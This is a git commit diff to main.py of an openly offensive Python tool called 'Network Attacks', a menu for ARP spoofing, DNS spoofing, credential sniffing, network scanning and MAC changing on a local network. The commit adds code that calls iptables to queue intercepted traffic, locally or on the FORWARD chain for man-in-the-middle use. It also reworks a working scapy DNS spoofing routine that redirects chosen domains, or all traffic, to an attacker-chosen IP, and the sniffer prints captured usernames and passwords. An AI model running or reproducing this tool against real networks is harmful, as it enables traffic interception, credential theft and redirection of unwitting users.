a30540ef45be95871031295860a09626d9e3fb9b
Heena Detani <56752043+heenadetani@users.noreply.github.com>
2020-12-13 20:51:42 -0800

    Update main.py

--- main.py
+++ main.py
@@ -4,10 +4,12 @@
 # For performing attacks on remote machine forward chain to be used to create queue
 #"iptables -I FORWARD -j NFQUEUE --queue-num 0"- FORWARD CHAIN
 
-import scapy.all as scapy 
+import scapy.all as scapy
 import time
 import sys
+import os
 import netfilterqueue
+from colorama import Fore, Style
 import argparse
 import optparse
 from scapy.layers import http
@@ -17,10 +19,58 @@ from network_scanner import scan, print_result
 from packet_sniffer import get_url, get_login_info
 from Mac_Changer import getmac, macchanger
 
+def manipulate_iptables(i):
+    """
+    MANIPULATING IPTABLES
+    """
+    # Manipulating iptables -------------------------------------------------------------------------
+    # Creating ip tables for intercepting QUEUE packets
+    try:
+        if i == 1:
+            # Run Attack locallly
+            os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
+            os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
+            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Iptables created successfully")
+        elif i == 2:
+            # Run Attack Remotely
+            os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Iptables created successfully")
+        else:
+            print("Invalid selection. Please run script one more time")
+    except:
+        print('[*] Fail to create iptables')
+        print('[*] Exiting ...!')
+        exit(1)
+    # Manipulating iptables -------------------------------------------------------------------------
+#flushing iptables
+def flush_iptables():
+    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " \n[-] Detected CTRl + C...Restoring iptables...")
+    os.system("iptables --flush")
+    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Successfully restored iptables ")
+    print(Style.BRIGHT + Fore.RED + "[*]" + Fore.WHITE + Style.BRIGHT + " Exiting....")
+    exit(0)
+
 
 if __name__ == "__main__":
+    """
+    HEADER
+    """
+    # Header Header header---------------------------------------------------------------------------
     banner = pyfiglet.figlet_format("Network Attacks", font = "slant"  ) 
-    print(banner) 
+    print(Fore.BLUE + Style.BRIGHT + """
+    
+    // ░░░    ░░ ░░░░░░░ ░░░░░░░░ ░░     ░░  ░░░░░░  ░░░░░░  ░░   ░░      ░░░░░  ░░░░░░░░ ░░░░░░░░  ░░░░░   ░░░░░░ ░░   ░░ ░░░░░░░ 
+    // ▒▒▒▒   ▒▒ ▒▒         ▒▒    ▒▒     ▒▒ ▒▒    ▒▒ ▒▒   ▒▒ ▒▒  ▒▒      ▒▒   ▒▒    ▒▒       ▒▒    ▒▒   ▒▒ ▒▒      ▒▒  ▒▒  ▒▒      
+    // ▒▒ ▒▒  ▒▒ ▒▒▒▒▒      ▒▒    ▒▒  ▒  ▒▒ ▒▒    ▒▒ ▒▒▒▒▒▒  ▒▒▒▒▒       ▒▒▒▒▒▒▒    ▒▒       ▒▒    ▒▒▒▒▒▒▒ ▒▒      ▒▒▒▒▒   ▒▒▒▒▒▒▒ 
+    // ▓▓  ▓▓ ▓▓ ▓▓         ▓▓    ▓▓ ▓▓▓ ▓▓ ▓▓    ▓▓ ▓▓   ▓▓ ▓▓  ▓▓      ▓▓   ▓▓    ▓▓       ▓▓    ▓▓   ▓▓ ▓▓      ▓▓  ▓▓       ▓▓ 
+    // ██   ████ ███████    ██     ███ ███   ██████  ██   ██ ██   ██     ██   ██    ██       ██    ██   ██  ██████ ██   ██ ███████ 
+
+    -------------- 💻💻💻💻💻💻💻💻💻 --------------- 👾👾👾👾👾👾👾👾👾 --------------------- 💻💻💻💻💻💻💻💻💻 ----------------
+    
+    //By ------------------ Heena Detani              |               https://github.com/heenadetani/Local-Area-Network-Attacks
+    """ + Fore.LIGHTWHITE_EX)
+    # Header Header header---------------------------------------------------------------------------
+    # print(banner) 
     print("Welcome to Network Attacks in Local Area Network")
     print("Please select from below options")
     print("{0:<15} : {1:<15}".format("[+] ARP Spoofing","Press 1"))
@@ -54,29 +104,34 @@ if __name__ == "__main__":
 
     #DNS Spoofing
     elif n == 2:
-        #parser=argparse.ArgumentParser()    
-        #parser.add_argument("-s","--spoof",dest="swebsite",help="Specify an website to spoof")  
-        #parser.add_argument("-r","--redirect",dest="dwebsite",help="Specify an website to redirect the user")
-        #options = parser.parse_args()
-        swebsite = input("Enter website to spoof ---> ")
-        dwebsite = input("Enter website to redirect the user ---> ")
+        # parser=argparse.ArgumentParser()    
+        # parser.add_argument("-s","--spoof",dest="swebsite",help="Specify an website to spoof")  
+        # parser.add_argument("-r","--redirect",dest="dwebsite",help="Specify an website to redirect the user")
+        # options = parser.parse_args()
+        website = input("Please Enter website from which to redirect, \nLeave empty to redirect all traffic :")
+        redirect_ip = input("Please Enter IP to which redirect : ")
+
         def process_packet(packet):
             scapy_packet = scapy.IP(packet.get_payload())
             # to check if packet has DNS Response Record(DNSRR)
             if scapy_packet.haslayer(scapy.DNSRR):
-                qname = scapy_packet[scapy.DNSQR].qname
-                if swebsite+"." == qname:
-                    print ("[+] Spoofing target")
-                    answer = scapy.DNSRR(rrname=qname, rdata=dwebsite)
+                #qname = scapy_packet[scapy.DNSQR].qname
+                b_qname = scapy_packet[scapy.DNSQR].qname
+                qname = b_qname.decode('utf-8')
+                if website in str(qname):
+                    print(Fore.CYAN + Style.BRIGHT + "[*]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " Redirecting " + str(qname) + " to " + redirect_ip)
+                    #print ("[+] Spoofing target")
+                    answer = scapy.DNSRR(rrname=b_qname, rdata=redirect_ip)
                     scapy_packet[scapy.DNS].an = answer
                     scapy_packet[scapy.DNS].ancount = 1
-                    del scapy_packet[scapy.IP].len
-                    del scapy_packet[scapy.IP].chksum
-                    del scapy_packet[scapy.UDP].len
-                    del scapy_packet[scapy.UDP].chksum
-                    packet.set_payload(str(scapy_packet))
+                    del scapy_packet[scapy.IP].len     # avoiding chksum error for IP Layer
+                    del scapy_packet[scapy.IP].chksum  # avoiding len error for IP Layer
+                    del scapy_packet[scapy.UDP].len    # avoiding chksum error for UDP Layer
+                    del scapy_packet[scapy.UDP].chksum # avoiding len error for IP Layer
+                    packet.set_payload(bytes(scapy_packet))  # setting altered packet
             packet.accept()
         queue = netfilterqueue.NetfilterQueue()
+        #Binding and running queue
         queue.bind(0, process_packet)
         queue.run()
 
@@ -111,9 +166,19 @@ if __name__ == "__main__":
                         packet.set_payload(str(modified_packet))
 
             packet.accept()
-        queue = netfilterqueue.NetfilterQueue()
-        queue.bind(0, process_packet)
-        queue.run()
+            queue = netfilterqueue.NetfilterQueue()
+            queue.bind(0, process_packet)
+            queue.run()
+            # print("{0:<15} : {1:<15}".format("[+] Test the attack locally","Press 1"))
+            # print("{0:<15} : {1:<15}".format("[+] Test the attack remotely","Press 2"))
+            # m = int(input("Please Enter Your Choice --> "))
+            # manipulate_iptables(m)
+            # queue = netfilterqueue.NetfilterQueue()
+            # queue.bind(0, process_packet)
+            # try:
+            #     queue.run()
+            # except KeyboardInterrupt: # Avoiding keyboard interruption
+            #     flush_iptables()
 
     #-----Network Scanner-------
     elif n == 4:
@@ -139,9 +204,17 @@ if __name__ == "__main__":
                         login_info = get_login_info(packet)
                         if login_info:
                                 print("\n\n[+] Possible username/password >> " + format(login_info) + "\n\n")
+        try:
+            print("{0:<15} : {1:<15}".format("[+] Test the attack locally","Press 1"))
+            print("{0:<15} : {1:<15}".format("[+] Test the attack remotely","Press 2"))
+            m = int(input("Please Enter Your Choice --> "))
+            manipulate_iptables(m)                                
+            interface = input("Enter the interface on which you want to sniff traffic --->")	    
+            sniff(interface)
+        except KeyboardInterrupt: # Avoiding keyboard interruption
+            flush_iptables()
+        
 
-        interface = input("Enter the interface on which you want to sniff traffic --->")	    
-        sniff(interface)
 
     #-----Mac Changer-----    
     elif n==6:
@@ -159,4 +232,5 @@ if __name__ == "__main__":
             print ("Error Occured Fix It !!!")
     else:
         print("Invalid selection. Please run script one more time")
+
 
